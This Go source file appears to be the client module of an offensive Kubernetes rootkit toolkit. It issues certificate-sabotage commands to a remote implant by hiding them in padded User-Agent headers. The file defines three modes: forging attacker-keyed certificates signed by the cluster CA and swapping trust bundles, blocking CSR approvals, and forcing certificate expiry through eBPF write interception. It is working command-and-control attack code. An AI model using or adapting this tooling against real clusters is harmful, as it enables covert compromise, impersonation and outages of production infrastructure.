package cert_sabotage

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type SabotageResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, mode, certTarget, output string) error {
	result := &SabotageResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch mode {
	case "inject":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"intercept_csr", "hook CSR approval flow to inject attacker-controlled certificate", "cert_intercept_csr"},
			{"forge_cert", "generate certificate with attacker key signed by cluster CA", "cert_forge"},
			{"replace_bundle", "replace target component trust bundle with forged certificate", "cert_replace"},
		}
	case "block":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"identify_rotation", "locate cert rotation controller and CSR approver", "cert_find_rotation"},
			{"block_approval", "intercept and deny CSR approval requests for target", "cert_block_approve"},
			{"verify_stale", "confirm target is still using soon-to-expire certificate", "cert_verify_stale"},
		}
	default: // expire
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"identify_certs", "enumerate certificates and their expiry for target component", "cert_enumerate"},
			{"block_renewal", "prevent cert-manager/kubelet from renewing certificates", "cert_block_renew"},
			{"accelerate_expiry", "manipulate notAfter field via eBPF vfs_write interception", "cert_accelerate"},
			{"verify_expiry", "confirm TLS handshakes are failing due to expired certificates", "cert_verify_expired"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + mode + "#" + certTarget
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/cert_sabotage", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
